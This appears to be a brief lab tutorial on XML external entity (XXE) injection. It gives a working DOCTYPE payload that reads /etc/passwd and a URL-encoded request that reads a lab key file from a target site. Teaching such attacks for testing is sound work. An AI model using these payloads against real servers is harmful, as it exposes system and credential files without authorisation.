# XML Attacks 01

Some XML parsers will resolve external entities, and will allow a user controlling the XML message to access resources; for example to read a file on the system. The following entity can be declared, for example:

`<!ENTITY x SYSTEM "file:///etc/passwd">`

You will need to envelope this properly, in order to get it to work correctly:

```
<!DOCTYPE test [
    <!ENTITY x SYSTEM "file:///etc/passwd">]>
```

You can then simply use the reference to x: \&x; (don't forget to encode &) to get the corresponding result inserted in the XML document during its parsing (server side).

`URL : https://someSite.com/?xml=<!DOCTYPE test [<!ENTITY x SYSTEM "file:///pentesterlab.key">]><test>&x;</test>`
